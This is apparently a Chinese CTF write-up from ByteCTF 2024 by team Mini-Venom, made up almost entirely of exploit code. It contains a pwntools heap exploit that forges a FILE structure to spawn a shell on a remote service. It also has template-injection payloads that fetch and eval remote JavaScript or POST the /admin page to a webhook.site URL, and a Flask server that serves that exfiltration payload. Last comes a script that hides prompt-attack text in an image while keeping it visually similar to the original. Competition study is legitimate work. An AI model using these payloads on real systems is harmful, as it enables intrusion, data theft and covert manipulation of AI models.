# 2024 ByteCTF大师赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/206654.html
> ID: 206654

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *

libc = ELF('./libc-2.27.so')
elf = ELF('./pwn')
p = remote('113.201.14.253',20791)

def add(size):
    p.sendlineafter('it:','1')
    p.sendlineafter('dd:',str(size))

def show(idx):
    p.sendlineafter('it:', '3')
    p.sendlineafter('how:',str(idx))

def edit(idx,size,content):
    p.sendlineafter('it:', '4')
    p.sendlineafter('it:', str(idx))
    p.sendlineafter('ize',str(size))
    p.sendlineafter('put',content)

def pwn():
    add(0x100)#0
    edit(0,0x110,b'a'*0x108+p64(0xca1))
    add(0x1000)#1
    add(0xc70)#2
    show(2)
    p.recvuntil('2: ')
    libc.address = u64(p.recv(6).ljust(8,b'x00'))-0x3ebca0
    print('libc:',hex(libc.address))
    stdout = libc.address+0x3ec760
    wfile_jump = libc.address+0x3e7d60
    add(0xdb0)#3
    add(0x10)#4
    edit(4,0x20,b'a'*0x18+p64(0x211))
    add(0xdc0)#5
    add(0x10)#6
    edit(6,0x20,b'a'*0x18+p64(0x211))
    add(0x1000)#7
    edit(6,0x28,b'a'*0x18+p64(0x1f1)+p64(stdout))
    fake_io = flat({
        0x0: b' sh',
        0xa0: p64(stdout-0x130+0xd8),
        0x10: p64(libc.symbols['system']),
        0x20: p64(stdout),
        0x98: p64(stdout-0x20+0x80),
        0xd8: p64(wfile_jump + 0x48 - 0x38),
        0x60: b'/bin/shx00',
        0x80: p64(libc.symbols['system']),
        0x88: p64(stdout - 0x30),
        0xe0: p64(stdout - 8),
    }, filler=b'x00')
    add(0x1e0)#8
    add(0x1e0)#9
    edit(9,len(fake_io),fake_io)
    p.interactive()
pwn()
```



```
/swagger-ui/index.html
/v3/api-docs/
```



```
/api/v1/users/updatePermission
```



```
profileRegex := regexp.MustCompile(`^.{0,80}$`)
```



```
{{fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69').then(a=>a.text().then(a=>eval(a)))}}
```



```
{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69/',{method:'POST',body:r}))}}
```



```
from flask import Flask, Response

app = Flask(__name__)

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_js(path):
    js_content = "{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69/',{method:'POST',body:r}))}}"
    # js_content = "{"html":"<img src=x onerror=alert(document.cookie)>"}"
    return Response(js_content, mimetype='application/javascript')

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=19002)
```



```
from PIL import Image, ImageDraw, ImageFont
import numpy as np
from skimage.metrics import structural_similarity as ssim
import textwrap

origin_image = Image.open('origin.png').convert('RGB')

similar_image = origin_image.copy()
draw = ImageDraw.Draw(similar_image)
font_path = "/System/Library/Fonts/Supplemental/Arial.ttf"
font_size = 19
font = ImageFont.truetype(font_path, font_size)

text_color = (255,255,255)
text_position = (0, 0)

lines = [
    # 构造多行 prompt 进行攻击
]

y_offset = 0
for line in lines:
    draw.text((text_position[0], text_position[1] + y_offset), line, font=font, fill=text_color)
    y_offset += font_size+2

similar_image.save('attack.png')

origin_np = np.array(origin_image.convert('L'))
similar_np = np.array(similar_image.convert('L'))
score, _ = ssim(origin_np, similar_np, full=True)
print(f'SSIM: {score}')
if score > 0.9:
    print("OK")
else:
    print("Failed")
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1727178889.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1727178890.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1727178890.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/1-1727178891.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1727178891.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1727178892.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1727178893.webp)